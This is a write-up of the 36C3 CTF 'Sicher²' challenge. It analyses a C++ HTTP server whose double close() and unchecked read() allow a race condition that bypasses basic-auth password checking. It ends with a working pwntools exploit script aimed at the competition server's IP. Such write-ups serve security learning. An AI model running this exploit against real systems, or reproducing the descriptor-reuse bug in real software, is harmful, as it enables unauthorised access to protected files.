# Sicher² - 36C3 CTF Pwn Challenge

667/1000 points pwn challenge, by [@yoavalon](https://twitter.com/yoavalon) and [@liadmord](https://twitter.com/liadmord) from [@5BC](https://twitter.com/5BCCTF)

## Intro
We are presented with a proprietary HTTP handler written in c++.
Opening up a browser and browsing to the challenge server brings up a simple web page that only contains a link.
Clicking on the link you are redirected to `/secret/flag.html`, which prompts a [HTTP basic authorization](https://en.wikipedia.org/wiki/Basic_access_authentication) request for a username and password.
Since we don't know the password, we can't view the flag, but we have learned two things already:

* The flag is saved in a file called flag.html inside a folder called secret
* We need a password to view the flag

Luckily(?) for us, we got the source code for the HTTP server, let's go quickly through the main parts.

## Main loop
```c++
int main()
{
    for (size_t i = 0; i < 1000; ++i) {
        auto req = parse_request();
        if (!req) {
            std::cout << "FAILED\n";
            break;
        }
retry:
        try {
            std::thread(handle_request, *req).detach();
        }
        catch (std::system_error&) {
            goto retry;
        }
    }
}
```

The server can receive up to 1000 HTTP requests. The `parse_request` function parses the HTTP request and passes the parsed request to `handle_request`, which is executed in a newly created thread.

## HTTP Request string parser
```c++
struct request_info
{
    std::string path;
    std::optional<std::string> password;
};

std::optional<request_info> parse_request()
{
    std::string line;
    std::vector<std::string> request;
    while (std::getline(std::cin, line)) {
        if ((line = rtrim(line)).empty()) break;
        request.push_back(line);
    }

    if (request.empty()) return {};

    request_info r;
    std::smatch m;

    if (!std::regex_match(request.front(), m, std::regex("^GET (/[^ ]*) HTTP/1\\.1$"))) return {};
    r.path = m[1];
    request.erase(request.begin());

    for (auto const& line: request) {
        if (!std::regex_match(line, m, std::regex("^Authorization: +Basic (.+)$"))) continue;
        auto user_password = b64decode(m[1]);
        if (!user_password) continue;
        if (!std::regex_match(*user_password, m, std::regex("^root:(.*)$"))) continue;
        r.password = m[1];
    }

    return r;
}
```
`parse_request` function reads from `stdin` line by line until we encounter a blank line (`\r\n\r\n`).
The server only accepts HTTP GET request, and if the request contains an Authorization header then it will save the credentials. The result is a `request_info` struct with a path and possibly credentials.

(Side note: the b64decode function was also proprietary, it contained a bug in the padding that could be used to crash the server, we couldn't find anything interesting to do with it so we left alone)

So far, other than being a bit lousy, and very limited, the code is okay, they have some bugs in it, but nothing you can really exploit.

## HTTP Request handler thread function
```c++
static bool check_password(std::string const& theirs)
{
    return theirs == rtrim(reader("password.txt").get());
}

static std::optional<bool> allowed(std::string path, std::optional<std::string> password = {})
{
    static const std::string root = *canonicalize("wwwroot");
    auto canon = canonicalize(path);
    if (!canon) return {};
    if (canon->find(root)) return false;
    if (canon->find("secret") != std::string::npos) return password && check_password(*password);
    return true;
}

void handle_request(request_info req)
{
    response_info res;

    std::string path = "wwwroot/"s + req.path + (*req.path.rbegin() == '/' ? "index.html" : "");

    auto ok = allowed(path, req.password);
    if (!ok) {
        res.status = 404;
        res.message = "I lost that long ago, or maybe I never had it, in any case it's not there now.";
    }
    else if (!*ok) {
        res.status = 401;
        res.message = "You shall not pass.";
        res.headers.push_back("WWW-Authenticate: Basic realm=\"secrets of hxp\"");
    }
    else {
        res.status = 200;
        res.message = "Take this!";
        res.content = reader(path).get();
    }

    const std::string crlf("\r\n");
    std::stringstream ss;
    ss << "HTTP/1.1 " << res.status << " " << res.message << crlf;
    for (auto const& h: res.headers) ss << h << crlf;
    ss << "Content-Length: " << res.content.length() << crlf;
    ss << crlf;
    ss << res.content;
    std::cout << ss.str() << std::flush;
}
```

`handle_request` calls the `allowed` function, based on the return value results in:
* 404 - file not found
* 401 - the authentication request we saw
* 200 - with a content of a file on the server

Looking at `allowed` it first creates a canonicalized version of the `webroot`, then it creates a canonicalized path for our URI.
If the cannot be cannonicalized, it returns `none`.
If the path is not in the webroot, it returns `false`.
If the path contains `"secret"` then it also checks for a password, and if everything is OK, it reads the content of the file and sends it back to us.

The password checking is very simple, it reads the contents of a file called `"password.txt"` and compares it to the password we gave as input.
So to summarize our goal - we need to read flag.html, which requires us to provide a secret password that was read from `"password.txt"`, doesn't sound too hard right?

By now we've covered most of the source code, but we have missed one crucial part:

## DIY file reader class AKA The bug(s)

```c++
class opener
{
    public:
        opener(std::string const& name, int mode) { fd = open(name.c_str(), mode); }
        virtual ~opener() { close(fd); }
    protected:
        int fd;
};

class reader: public opener
{
    public:
        reader(std::string const& name): opener(name, O_RDONLY) {}
        ~reader() { close(fd); }
        std::string get()
        {
            std::string s, t(42, 0);
            for (ssize_t n = 0; (n = read(fd, &t[0], 42)) > 0; t.resize(n), s += t);
            std::cout << "Got content: " << s << "\n";
            return s;
        }
};
```

We are presented with 2 classes here: `opener` and `reader`.
The `opener` class encapsulates opening and closing a file. `opener` has a virtual destructor to allow other classes to inherit it. The `reader` class, uses `opener` to open a file, and implements a `get` function to read the content of the file. In `reader` we find two bugs:
1. The author did not add [virtual](https://www.geeksforgeeks.org/virtual-destructor/) to its destructor, and it closes the file in its own destructor. In C++ if a base class has a virtual destructor, and the derived class wants to override the destructor, it must mark it as virtual, otherwise, both destructors will be called. This bug gives us a pretty awesome primitive, whenever an instance of `reader` is destroyed, `close(fd)` is called twice. This sounds interesting, but not enough, let's continue our bug search.

2. In the `get` function of the `reader` class, it creates a string, and then reads 42 bytes into that string each time from a file, until the read function returns 0 or less. The mistake here is not checking the return code from read, because getting 0 or less could mean a lot more than just "finished reading the file" (hint: it could warn you that the file was closed :) )

Let's remind ourselves of the file opening code flows:
```
+-----------------------+           +---------------------------+
|Secret HTTP GET request|           |Non secret HTTP GET request|
+-----------+-----------+           +------------+--------------+
            |                                    |
            |                                    |
   +--------+--------+                  +--------v----------+
   |Open password.txt|                  |Requested file open|
   +--------+--------+                  +--------+----------+
            |                                    |
            |                                    |
       +----v----+   +-----------------+    +----v----+
       |File read+--->Compare passwords|    |File read|
       +----+----+   +-----------------+    +----+----+
            |                                    |
            |                                    |
       +----v-----+                         +----v-----+
       |File close|                         |File close|
       +----+-----+                         +----+-----+
            |                                    |
            |                                    |
       +----v-----+                         +----v-----+
       |File close|                         |File close|
       +----------+                         +----------+
```

At this point we understood that we have a race condition between the closing of the fd's, using our late night brains we thought of the following awful race flow:
1. Send a secret HTTP request
2. `"password.txt"` is opened (`fd=3`), read and closed once (`fd=3`)
3. Send a Non-secret HTTP request
4. File is opened (`fd=3`)
5. `"password.txt"` (`fd=3`) is closed again
6. Send a secret HTTP request
7. `"password.txt"` is opened (`fd=3`)
8. The non-secret opened file is now read (`fd=3`)
9. The content of `"password.txt"` is read in the session of stage 3, and sent back to us.

This flow sent us down a very deep rabbit hole, we wrote a lot of tests and fuzzed the ways we could create our HTTP requests, we also tried using the implementation of the `canonicalize` function with links and directory traversal to slow down parts of the code in hope to achieve success in this race condition flow, it is truly amazing how much you can complicate things when tired.

After a good nights sleep and a pretty bad all night fuzzing script attempt, [@yoavalon](https://twitter.com/yoavalon) came to the bright idea that we can mess up the reading of `"password.txt"` and authenticate with an empty password using the following race condition flow:

1. Send a Non-secret HTTP request
2. Non-secret file is opened (`fd=3`), read and closed once (`fd=3`)
3. Send a request to "/secret/flag.html" with root username and an *empty* password
4. `"password.txt"` is opened and receives the same fd (`fd=3`) as the previous flow
5. The previous flow closes the file again (`fd=3`)
6. `"password.txt"` is read, but the fd is closed, leaving the read string empty.
7. The empty string is compared against the empty password we provided, the server sends us back `flag.html`

## The exploit

```python
from pwn import *
import base64

single_payload =  """GET /secret/flag.html HTTP/1.1
Authorization: Basic {passwd}

GET /secret/flag.html HTTP/1.1
Authorization: Basic {passwd}

GET /secret/flag.html HTTP/1.1
Authorization: Basic {passwd}

GET / HTTP/1.1

""".format(passwd=base64.b64encode(b'root:').decode())

attack_payload = single_payload * 200

def attack(target):
    target.send(attack_payload.encode())
    stdout = target.recv()
    return stdout.decode()

while True:
    # result = attack(process('./vuln'))
    result = attack(remote('78.47.90.92', 80))
    flag = re.findall('hxp{[^}]+}', result)
    if not flag:
        continue

    print(flag[0])
    break

```

hxp{s0rrY_w3_4Re_cL0s3D}

Thank you for reading.

[Source for the challenge, exploit and write for your own pleasure and testing](https://github.com/liadmord/36c3_ctf_sicher)